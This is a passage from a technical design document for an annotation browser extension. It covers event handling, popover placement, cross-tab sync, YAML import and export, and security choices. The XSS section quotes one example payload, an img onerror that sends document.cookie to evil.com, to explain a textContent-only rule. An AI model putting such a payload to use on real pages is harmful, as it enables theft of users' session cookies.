Annotation mode is controlled by a boolean `let annotationModeActive = false` in the content script. All annotation mode event listeners are registered once (at init) but short-circuit when `annotationModeActive` is false.

#### Click Interception

Native clicks are suppressed using a **capturing-phase listener** (third argument `true`). Capturing fires before the element's own handlers, enabling full suppression:

```javascript
document.addEventListener('click', (e) => {
  if (!annotationModeActive) return;
  if (isAnnotatorElement(e.target)) return; // let toolbar/popover handle their own clicks
  e.preventDefault();
  e.stopImmediatePropagation(); // stop all other handlers on this element too
  handleAnnotationClick(e);
}, true);
```

`isAnnotatorElement(el)` returns true if the element is inside the toolbar host, a pin, or the popover host:
```javascript
function isAnnotatorElement(el) {
  return (
    el.closest('#annotator-host') !== null ||
    el.closest('#annotator-popover-host') !== null ||
    el.classList?.contains('annotator-pin') ||
    el.closest('.annotator-pin') !== null
  );
}
```

**`handleAnnotationClick(e)`:**
1. If `e.target` is a pin element (or inside one): extract `pinId` from `data-pin-id`, open popover pre-filled with that annotation's note
2. Otherwise: capture fingerprint at `e.target`, compute offset `{ x: e.clientX - rect.left, y: e.clientY - rect.top }`, open blank popover for new annotation

#### Hover Highlight

Hover uses `mouseover`/`mouseout` (not `mouseenter`/`mouseleave`) because `mouseover` bubbles and fires when entering any child — which gives us the immediate target element:

```javascript
let highlightedEl = null;

document.addEventListener('mouseover', (e) => {
  if (!annotationModeActive || popoverOpen) return;
  if (isAnnotatorElement(e.target)) return;
  if (highlightedEl) highlightedEl.classList.remove('annotator-highlighted');
  highlightedEl = e.target;
  highlightedEl.classList.add('annotator-highlighted');
}, true);

document.addEventListener('mouseout', (e) => {
  if (!annotationModeActive) return;
  if (e.target === highlightedEl) {
    highlightedEl.classList.remove('annotator-highlighted');
    highlightedEl = null;
  }
}, true);
```

Highlight CSS (injected by content script into the page, not Shadow DOM — it needs to apply to page elements):
```css
.annotator-highlighted {
  outline: 2px solid #E040FB !important;
  outline-offset: 2px !important;
  cursor: crosshair !important;
  box-sizing: border-box !important;
}
```

**When annotation mode exits:** Remove `annotator-highlighted` from any currently highlighted element, set `annotationModeActive = false`, set `popoverOpen = false`.

---

### 6.7 Popover Implementation

#### DOM Structure

The popover is a separate Shadow DOM host appended to `<body>` (not inside the toolbar's shadow root, to avoid stacking context and positioning constraints):

```javascript
const popoverHost = document.createElement('div');
popoverHost.id = 'annotator-popover-host';
const popoverShadow = popoverHost.attachShadow({ mode: 'closed' }); // store this ref
document.body.appendChild(popoverHost);
```

Internal structure:
```html
<!-- inside popoverShadow -->
<div class="popover">
  <button class="close" aria-label="Close">&#x2715;</button>
  <textarea
    class="note-input"
    maxlength="400"
    placeholder="Add a note..."
  ></textarea>
  <div class="footer">
    <button class="delete">Delete</button>
    <span class="counter">0 / 400</span>
    <button class="add" disabled>Add</button>
  </div>
</div>
```

**Positioning:** The popover is `position: fixed` (so it doesn't scroll away) with `z-index: 2147483646`. Position is calculated from the pin's screen coordinates:

```javascript
function positionPopover(pinScreenX, pinScreenY) {
  const PIN_SIZE = 24;
  const MARGIN = 8;
  const pw = 280;                          // must match `.popover { width: 280px }` in CSS
                                            // do NOT use offsetWidth here: it is 0 before layout completes
  const ph = popover.offsetHeight || 160;  // dynamic (varies by content); 160px is a pre-layout fallback
  const vw = window.innerWidth;
  const vh = window.innerHeight;

  const candidates = [
    { left: pinScreenX + PIN_SIZE + MARGIN,  top: pinScreenY },                          // bottom-right of pin
    { left: pinScreenX + PIN_SIZE + MARGIN,  top: pinScreenY - ph + PIN_SIZE },           // top-right
    { left: pinScreenX - pw - MARGIN,        top: pinScreenY - ph + PIN_SIZE },           // top-left
    { left: pinScreenX - pw - MARGIN,        top: pinScreenY },                           // bottom-left
  ];

  const pos = candidates.find(c =>
    c.left >= 0 && c.top >= 0 &&
    c.left + pw <= vw && c.top + ph <= vh
  ) || candidates[0]; // fallback to first if all overflow

  Object.assign(popoverHost.style, { left: pos.left + 'px', top: pos.top + 'px', position: 'fixed' });
}
```

#### Character Counter

```javascript
noteInput.addEventListener('input', () => {
  counter.textContent = `${noteInput.value.length} / 400`;
  addBtn.disabled = noteInput.value.trim().length === 0;
});
```

#### Click-Outside Detection

The popover's click-outside detection must coexist with annotation mode's click interception. Since annotation mode already stops propagation on all page clicks (capturing phase), the click-outside handler must also use the capturing phase and run before annotation mode's handler:

```javascript
document.addEventListener('click', (e) => {
  if (!popoverOpen) return;
  if (e.composedPath().includes(popoverHost)) return; // click inside popover
  closePopover(/* save= */ false);
  // Don't call e.stopPropagation() here — let annotation mode's handler also run
}, true);
```

`e.composedPath()` correctly traverses through Shadow DOM boundaries, so clicks inside the shadow root are detected.

**Listener ordering:** Register the click-outside listener before the annotation mode click listener (registration order determines capture-phase order). Or use a single unified handler that checks popover state first.

#### Delete Confirmation

The delete button shows an inline confirmation inside the popover (not a browser `confirm()` dialog — those are blocked in some contexts and look native/jarring):

1. First click on Delete: popover body text changes to "Delete this annotation? This cannot be undone." with **Confirm** and **Cancel** buttons
2. Confirm: delete annotation from storage, close popover
3. Cancel: restore normal popover view

#### Focus Management

```javascript
function openPopover(annotation) {
  // ... set content ...
  popoverHost.style.display = 'block';
  popoverOpen = true;
  // Focus textarea after display (use requestAnimationFrame to ensure layout is complete)
  requestAnimationFrame(() => noteInput.focus());
}
```

---

## 7. Cross-Tab Sync

### 7.1 `chrome.storage.onChanged` Listener

Every active content script instance registers a storage change listener on init:

```javascript
chrome.storage.onChanged.addListener((changes, area) => {
  if (area !== 'local') return;

  const domainKey = `annotations:${currentDomain}`;
  if (!changes[domainKey]) return;

  const newData = changes[domainKey].newValue;
  if (!newData) return; // domain data was deleted

  refreshPinsFromStorage(newData);
  updateToolbarState(newData);
});
```

### 7.2 `refreshPinsFromStorage(newData)`

1. Get annotations for `currentPageUrl` from `newData.pages`
2. Diff against currently rendered pins:
   - Pins in new data but not rendered → resolve element + render
   - Pins rendered but not in new data → remove from DOM
   - Pins in both → update note (no re-render needed unless offset changed)
3. Update toolbar button states (Export enabled/disabled, etc.)
4. Recalculate and display page-level alert

### 7.3 Concurrency Model

Last-write-wins. Two tabs writing simultaneously may overwrite each other's changes. This is explicitly accepted in requirements (§2 Multi-Tab Behavior). No optimistic locking, no CRDTs, no merge strategy.

### 7.4 Own-Write Handling

When the current tab writes to storage, `onChanged` fires in the **same tab too**. The `suppressNextChange` boolean + `setTimeout` approach that was considered here is fragile: two rapid writes within the timeout window cause the flag to clear too early, and the timeout window is arbitrary.

**Decision: don't suppress own-write events.** Instead, make `refreshPinsFromStorage` idempotent so that re-processing the same state is a no-op:

- Pins already rendered with the correct position/note are not re-created (diff logic in §7.2: "Pins in both → update note only if changed")
- Toolbar button states are set to the same values they already have
- There is no visible flicker or user-facing side effect from processing an own-write

This is the simpler and more correct approach. No suppression mechanism needed.

---

## 8. Import Pipeline

### 8.1 Step-by-Step

```
File selected via <input type="file">
  │
  ├─ [size check] > 8MB → Error #13: "File too large"
  │
  ├─ [extension check] not .yaml/.yml → Error #1: "Invalid file type"
  │
  ├─ [read file as UTF-8 text]
  │
  ├─ [empty check] length == 0 → Error #2: "File is empty"
  │
  ├─ [YAML parse] fails → Error #3: "Corrupted or malformed"
  │
  ├─ [schema validation]
  │   ├─ missing required keys → Error #4: "Doesn't look like Annotator file"
  │   ├─ empty annotations array → Error #10: "No annotations"
  │   └─ duplicate pin_numbers → Error #14: "Duplicate pin numbers"
  │
  ├─ [version check] file.version > CURRENT_VERSION → Warning #6 (continue)
  │
  ├─ [domain check] file.domain != currentDomain → Error #5: "Wrong domain"
  │
  ├─ [existing data check]
  │   ├─ has annotations AND no unsaved changes → Confirmation #11
  │   └─ has annotations AND has unsaved changes → Confirmation #12
  │   (user cancels → abort; user confirms → continue)
  │
  ├─ [store annotations]
  │   ├─ Transform YAML objects to internal Annotation format
  │   ├─ Build storage object keyed by page URL
  │   ├─ Set meta.nextPinNumber = max(pin_numbers) + 1
  │   ├─ Set meta.importedFilename = file.name
  │   └─ Write to chrome.storage.local
  │
  ├─ [render current page]
  │   ├─ Get annotations for currentPageUrl
  │   ├─ Attempt resolution for each (§4.4)
  │   └─ Render resolved pins
  │
  ├─ [display toolbar state]
  │   ├─ Show filename above buttons
  │   └─ Show page-level alert if unresolved pins exist
  │
  ├─ [activate annotation mode] (auto-enter per §1.4)
  │
  └─ [reset file input] input.value = '' — allows re-selection of same file on error or retry
```

### 8.2 File Reading

```javascript
async function readFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = (e) => resolve(e.target.result); // UTF-8 string
    reader.onerror = () => reject(new Error('File read failed'));
    reader.readAsText(file, 'UTF-8');
  });
}
```

### 8.3 YAML Parsing

Use the `js-yaml` library (bundled into the content script). Parse with `yaml.load(text, { schema: yaml.JSON_SCHEMA })`. The `JSON_SCHEMA` option restricts the parser to safe JSON-compatible types — no `!!js/function` or other unsafe tags.

```javascript
import * as yaml from 'js-yaml';

function parseYAML(text) {
  try {
    return yaml.load(text, { schema: yaml.JSON_SCHEMA });
  } catch (e) {
    throw new ImportError('MALFORMED');
  }
}
```

### 8.4 Schema Validation

```javascript
function validateSchema(doc) {
  if (!doc || typeof doc !== 'object') throw new ImportError('WRONG_SCHEMA');
  if (!('version' in doc) || !('domain' in doc) || !Array.isArray(doc.annotations))
    throw new ImportError('WRONG_SCHEMA');
  if (doc.annotations.length === 0)
    throw new ImportError('EMPTY_ANNOTATIONS');

  const pinNumbers = new Set();
  for (const ann of doc.annotations) {
    // Type-check required fields (presence + type)
    if (!Number.isInteger(ann.pin_number) || ann.pin_number < 1)
      throw new ImportError('WRONG_SCHEMA');  // pin_number must be a positive integer
    if (typeof ann.page_url !== 'string' || !ann.page_url)
      throw new ImportError('WRONG_SCHEMA');
    if (typeof ann.note !== 'string')          // allow empty string — don't use !ann.note
      throw new ImportError('WRONG_SCHEMA');
    if (!ann.fingerprint || typeof ann.fingerprint !== 'object')
      throw new ImportError('WRONG_SCHEMA');
    if (typeof ann.fingerprint.css_selector !== 'string' ||
        typeof ann.fingerprint.xpath !== 'string' ||
        typeof ann.fingerprint.text_snippet !== 'string' ||
        typeof ann.fingerprint.tag_name !== 'string')
      throw new ImportError('WRONG_SCHEMA');  // validate all fingerprint sub-fields
    if (!ann.offset || typeof ann.offset.x !== 'number' || typeof ann.offset.y !== 'number')
      throw new ImportError('WRONG_SCHEMA');  // offset x/y must be numbers

    if (pinNumbers.has(ann.pin_number))
      throw new ImportError('DUPLICATE_PINS');
    pinNumbers.add(ann.pin_number);
  }
}
```

### 8.5 Domain Check

```javascript
const fileDomain = normaliseDomain(doc.domain);
const currentDomain = normaliseDomain(location.hostname);
if (fileDomain !== currentDomain)
  throw new ImportError('WRONG_DOMAIN', { fileDomain, currentDomain });
```

### 8.6 Error Display

All `ImportError` types map to a display string and style:

```javascript
const ERROR_MESSAGES = {
  FILE_TOO_LARGE:      { msg: 'This file is too large to import (max 8MB).', style: 'error' },
  WRONG_TYPE:          { msg: 'Invalid file type. Please upload a .yaml annotation file.', style: 'error' },
  EMPTY_FILE:          { msg: 'This file is empty. Nothing to import.', style: 'error' },
  MALFORMED:           { msg: 'Could not read this file — it appears to be corrupted or incorrectly formatted.', style: 'error' },
  WRONG_SCHEMA:        { msg: "This file doesn't look like an Annotator file. Please check you're uploading the right file.", style: 'error' },
  EMPTY_ANNOTATIONS:   { msg: 'This file exists but contains no annotations.', style: 'error' },
  DUPLICATE_PINS:      { msg: 'This file appears to be corrupted (duplicate pin numbers detected).', style: 'error' },
  WRONG_DOMAIN:        { msg: (d) => `This file contains annotations for \`${d.fileDomain}\`, but you're currently on \`${d.currentDomain}\`.`, style: 'error' },
  VERSION_MISMATCH:    { msg: 'This file was created with a newer version of Annotator. Some annotations may not display correctly.', style: 'warning' },
};
```

Errors are displayed in the toolbar's notification area (above the buttons), styled red for errors and yellow for warnings. The notification auto-clears after 8 seconds or on the next user action.

**Timer management:** Use a single `let notifTimer = null` in the notification module. Clear any existing timer before setting a new one to prevent an old timer from clearing a newer message:

```javascript
let notifTimer = null;
function showNotification(msg, style) {
  clearTimeout(notifTimer);           // cancel previous auto-clear
  setNotificationContent(msg, style);
  notifTimer = setTimeout(() => clearNotification(), 8000);
}
```

---

## 9. Export Pipeline

### 9.1 Step-by-Step

```
User clicks Export
  │
  ├─ Read all annotation data for currentDomain from chrome.storage.local
  │
  ├─ Flatten into sorted annotation array (sorted by pin_number ascending)
  │
  ├─ Build YAML document object:
  │   {
  │     version: CURRENT_EXPORT_VERSION,
  │     exported_at: new Date().toISOString(),
  │     domain: currentDomain,
  │     annotations: [...]
  │   }
  │
  ├─ Serialise to YAML string using js-yaml
  │
  ├─ Create Blob (UTF-8, type: 'application/x-yaml')
  │
  ├─ Create object URL and trigger download via <a download="...">
  │
  └─ Revoke object URL after click
```

### 9.2 Filename Generation

```javascript
function exportFilename(domain) {
  // "figma.com" → "annotations-figma_com.yaml"
  return `annotations-${domain.replace(/\./g, '_')}.yaml`;
}
```

### 9.3 YAML Serialisation

```javascript
import * as yaml from 'js-yaml';

function serialiseToYAML(doc) {
  return yaml.dump(doc, {
    sortKeys: false,       // preserve field order for readability
    lineWidth: 120,        // wrap long lines
    noRefs: true,          // no YAML anchors/aliases
    schema: yaml.JSON_SCHEMA,
  });
}
```

**Field order:** With `sortKeys: false`, output field order matches JS object property insertion order. Build the doc object and each annotation object in the exact order shown in §3.1 to ensure output matches the documented schema example:

```javascript
const ann = {
  pin_number: a.pinNumber,
  page_url: a.pageUrl,
  note: a.note,
  fingerprint: {
    css_selector: a.fingerprint.cssSelector,
    xpath: a.fingerprint.xpath,
    text_snippet: a.fingerprint.textSnippet,
    tag_name: a.fingerprint.tagName,
    // boundingBox intentionally excluded from export
  },
  offset: { x: a.offset.x, y: a.offset.y },
  created_at: a.createdAt,
};
```

### 9.4 Download Trigger

```javascript
function triggerDownload(content, filename) {
  const blob = new Blob([content], { type: 'application/x-yaml; charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.style.display = 'none';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}
```

No `chrome.downloads` API needed — the simple anchor click approach works within the content script context and requires no additional permissions.

### 9.5 Export Includes All Pages

The export collects annotations from **all page URL keys** under the current domain's storage object, not just the current page. This ensures round-trip fidelity — annotations for pages the user has not visited since importing are preserved.

---

## 10. Security

### 10.1 No Network Calls

The extension makes **zero network requests**. This is enforced at two levels:

**Manifest CSP:**
```json
{
  "content_security_policy": {
    "extension_pages": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; object-src 'none'; frame-src 'none'"
  }
}
```

`connect-src 'none'` blocks all `fetch`, `XMLHttpRequest`, and WebSocket calls from extension pages.

Content scripts run in the page's CSP context, not the extension's. However, the content script code never calls `fetch`, `XMLHttpRequest`, `WebSocket`, or any network API. The bundled `js-yaml` library is a pure parser with no network activity.

**No `host_permissions` beyond what's needed** — see §10.3.

### 10.2 No Remote Scripts

- All JavaScript is bundled at build time into the extension package
- No CDN links, no `eval`, no `new Function()`, no dynamic `<script>` injection
- `js-yaml` is vendored (bundled), not loaded from a CDN
- The extension has no update server for code (only Chrome Web Store updates, which are integrity-verified by Chrome)

### 10.3 Minimal Permissions

```json
{
  "permissions": [
    "storage",       // chrome.storage.local for annotation persistence
    "scripting",     // chrome.scripting.executeScript for on-demand injection
    "tabs"           // chrome.tabs.onUpdated / onRemoved for reload persistence
  ],
  "host_permissions": [
    "<all_urls>"     // required to inject content scripts on any website
  ]
}
```

**Justification:**
- `storage`: annotation persistence
- `scripting`: on-demand content script injection (not declared in `content_scripts` to avoid running on every page load)
- `tabs`: tab lifecycle management for reload re-injection
- `<all_urls>`: the extension's core value is working on any website; there is no way to achieve this with narrower permissions

**Not requested:**
- `downloads` — not needed; anchor-click download works without it
- `notifications` — not used
- `identity` — not used
- `webRequest` — not used

### 10.4 Data Locality

- All data stored in `chrome.storage.local` — local to device, not synced
- Export files are downloaded to the user's device; no upload occurs
- Import reads a local file chosen by the user; no data is sent anywhere
- The extension has no analytics, telemetry, crash reporting, or update pings

### 10.5 Open Source Auditability

- No code obfuscation. Source maps are included in the build.
- All dependencies are vendored and pinned to specific versions
- Build is reproducible from source: `npm run build` produces the exact same output
- The manifest explicitly lists all permissions with justifications in `PERMISSIONS.md`

---

### 10.6 XSS Prevention

The extension handles user-provided text (annotation notes typed by the user) and file-provided text (notes, filenames, and domain names from imported YAML). If any of this content is ever rendered via `innerHTML`, it becomes an XSS attack vector. A malicious annotation file with `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` in a note field would execute in the context of the host page if inserted carelessly.

**Rule: all user-provided and file-provided strings are inserted via `textContent` or `innerText`. Never `innerHTML`. Never `insertAdjacentHTML`. No exceptions.**

This applies to:
- Annotation note text in the popover `<textarea>` (safe by construction — `<textarea>` content is not HTML-parsed)
- Any note text rendered outside a textarea (tooltips, previews in future versions) → `textContent`
- Filename display in the toolbar → `textContent`
- Domain names appearing in error messages → `textContent`
- Any string read from the imported YAML file → `textContent`

If formatted output is ever needed in a future version, use a strict allowlist sanitizer — never `innerHTML` with raw user content.

---

## 11. Trade-offs & Alternatives Considered

### 11.1 Shadow DOM for Pins vs. Pins as Plain DOM Elements

**Decision:** Plain DOM elements for pins, Shadow DOM for the toolbar.

**Considered:** Using Shadow DOM for every pin element.

**Rejected because:** Shadow DOM adds meaningful complexity (especially for `closed` mode) and provides no benefit for pins. Pins have trivial CSS needs (a circle with a number). Style encapsulation via a unique class prefix is sufficient. The main risk — page styles overriding pin visibility — is handled with `!important` on position, display, and z-index.

**Shadow DOM kept for toolbar:** The toolbar has complex internal structure and is vulnerable to page CSS cascade (e.g. a page that sets `* { display: flex }` would break toolbar layout). Shadow DOM provides genuine isolation here.

---

### 11.2 `chrome.storage.local` vs. IndexedDB

**Decision:** `chrome.storage.local`.

**Considered:** IndexedDB, which offers larger quotas (no fixed limit), richer querying, and transactional writes.

**Rejected because:** IndexedDB is significantly more complex to use (async transaction model, cursor-based reads, explicit versioning). For v1, the data model is simple enough that a single JSON blob per domain fits in `storage.local`. The 10MB limit is more than the 8MB requirement. If v2 needs to handle thousands of annotations or multiple user profiles, IndexedDB is the right migration path — but that's a future problem.

---

### 11.3 On-Demand Script Injection vs. `content_scripts` in Manifest

**Decision:** On-demand injection via `chrome.scripting.executeScript`.

**Considered:** Declaring the content script in `manifest.json` so it auto-injects on every page.

**Rejected because:** This would run the extension's JavaScript on every single page the user visits, even when they never use it. This wastes CPU and memory, and creates unnecessary attack surface. The requirements explicitly state the toolbar should only appear when the user clicks the extension icon. On-demand injection satisfies this precisely.

**Trade-off accepted:** Re-injection on page reload requires background service worker to track active tabs via `activeTabIds`. This is slightly more complex but the right design.

---

### 11.4 `activeTab` Permission vs. `<all_urls>` Host Permission

**Decision:** `<all_urls>` host permission.

**Considered:** Using `activeTab` permission, which only grants access to the current tab when the user clicks the extension icon.

**Rejected because:** `activeTab` doesn't persist across page navigations. The content script needs to survive page reloads (auto-reinject) and the background worker needs to programmatically inject into tabs. `activeTab` is a one-shot permission scoped to a single user gesture — it can't support the reload-persistence requirement. `<all_urls>` is the only practical choice for a persistent, domain-wide annotation tool.

---

### 11.5 MutationObserver for Dynamic Content vs. Static Resolution

**Decision:** Static resolution at render time. No MutationObserver in v1.

**Considered:** Using `MutationObserver` to watch for elements being added to the DOM and retroactively place pins when their target elements appear.

**Rejected because:** This is significantly more complex to implement correctly (false positive mutations, infinite loops, performance impact on heavy SPAs) and the v1 requirements explicitly defer this to v2. The existing text-match fallback and page-level alert system adequately communicates to the user when resolution fails. MutationObserver would be the right v2 improvement for React/SPA pages where target elements are conditionally rendered.

---

### 11.6 Global Pin Numbering vs. Per-Page Numbering

**Decision:** Global, continuous numbering across the domain.

**Considered:** Resetting pin numbers to 1 on each page.

**Kept as designed:** The requirements explicitly call for global numbering as a cross-page reference system ("see pin 12"). This is a product decision; the implementation is straightforward (a single `nextPinNumber` counter in `meta`).

---

### 11.7 YAML vs. JSON for Export Format

**Decision:** YAML.

**Considered:** JSON (simpler to implement, no dependency needed), CSV (simpler but loses structure).

**YAML chosen because:** The requirements explicitly specify YAML. It is significantly more human-readable than JSON (especially for multi-line text fields and nested structures), which is a stated goal. The `js-yaml` library adds ~40KB to the bundle, which is acceptable. JSON would have been the simpler technical choice.

---

### 11.8 Bundler Choice

**Decision:** esbuild.

**Considered:** webpack, Rollup, Parcel.

**esbuild chosen because:** Fast build times (millisecond rebuilds during development), minimal configuration, good tree-shaking. For a single content script entry point with a handful of modules and one external dependency (`js-yaml`), esbuild is the obvious choice. webpack's configuration overhead is not justified here.

---

### 11.9 Popover Position Calculation

**Decision:** CSS-based overflow detection with four candidate positions.

The popover attempts placement in priority order: bottom-right → top-right → top-left → bottom-left. Each candidate is tested against `window.innerWidth` / `window.innerHeight` before committing.

**Not considered:** Floating UI / Popper.js. These are excellent libraries, but adding a dependency for a four-position fallback is over-engineering. The calculation is ~30 lines of plain JS.

---

### 11.10 Pin Anchor: Click Point vs. Element Corner

**Decision:** Store and render at the exact click point (as an offset from element top-left).

**Considered:** Always anchoring the pin to the element's top-left corner (offset = 0,0).

**Rejected because:** The requirements explicitly call for the pin to appear at the exact point the user clicked. This is better UX — users click the interesting part of the element (e.g. a specific word), not the element's corner. The offset-from-top-left approach handles element repositioning correctly while preserving the intended pin location.

---

*End of Technical Design Document*
